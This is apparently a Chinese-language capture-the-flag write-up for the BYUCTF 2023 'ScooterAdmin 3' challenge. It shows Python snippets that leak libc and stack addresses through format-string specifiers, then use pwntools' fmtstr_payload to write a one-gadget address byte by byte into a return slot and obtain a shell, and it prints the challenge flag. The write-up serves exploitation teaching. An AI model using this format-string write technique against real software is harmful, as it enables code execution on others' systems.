# BYUCTF 2023 - ScooterAdmin 3

## 题目简述

同一处格式化字符串还提供 `%n` 任意写。二进制启用 Full RELRO、PIE、NX 和栈保护，不能直接改 GOT；需要先泄漏 libc 与栈地址，再覆盖控制流数据。

## 解题过程

官方脚本先用两个参数槽建立地址基准：

```python
libc_base = int(leak_785, 16) - 0x751cd
one_gadget = libc_base + 0x50a37
target = int(leak_780, 16) + 0x2298
```

`%785$p` 指向随题提供的 libc，`%780$p` 提供栈基准；偏移均由本地同版本进程核定。随后用 `fmtstr_payload` 以第 6 个格式化参数为起点，把 one-gadget 地址的低 6 字节逐字节写到目标返回控制槽：

```python
for i in range(6):
    value = (one_gadget >> (8 * i)) & 0xff
    payload = fmtstr_payload(6, {target + i: value}, write_size='byte')
```

选择退出菜单触发函数返回，控制流落到 `libc + 0x50a37`，满足约束后生成 shell。读取 `flag3.txt`：

```text
byuctf{ScootersAndPrintfInjectionsAreOldschool}
```

官方 README 没有列出第三题 flag，但仓库中的 `src/flag3.txt` 和官方 `solve3.py` 完整支持上述结果。

## 方法总结

Full RELRO 只封住 GOT 改写，不会消除格式化字符串的任意写。现代保护下应先寻找仍可写且会被控制流使用的栈槽，并以字节写减少打印宽度和地址中 NUL 字节带来的问题。
